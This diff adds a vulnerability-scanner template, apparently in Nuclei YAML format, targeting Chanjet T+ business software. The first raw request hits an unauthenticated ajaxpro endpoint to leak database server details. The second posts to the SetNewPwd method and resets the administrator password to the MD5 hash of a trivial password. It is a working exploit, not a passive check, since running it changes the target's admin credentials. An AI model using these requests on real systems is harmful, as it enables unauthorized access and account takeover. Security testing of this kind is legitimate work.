@@ -1,0 +1,39 @@
+id: chanjet-unauthorized-access
+info:
+  name: Chanjet GetDefaultBackPath Unauthorized Access and Admin Password Reset
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Chanjet T+ is a management software that fully satisfies the needs of the integrated management of corporate finance and business. The system suffers from unauthorized access vulnerabilities allowing attackers to access sensitive information and reset admin passwords.
+  tags: permission-bypass,unauthorized-access
+  reference:
+    - https://www.chanjet.com/
+
+http:
+  - raw:
+      - |
+        GET /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetDefaultBackPath HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Chanjet"
+          - "DBServer"
+        part: body
+
+  - raw:
+      - |
+        POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"pwdNew":"e10adc3949ba59abbe56e057f20f883e"}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{\"value\":true}"
+        part: body
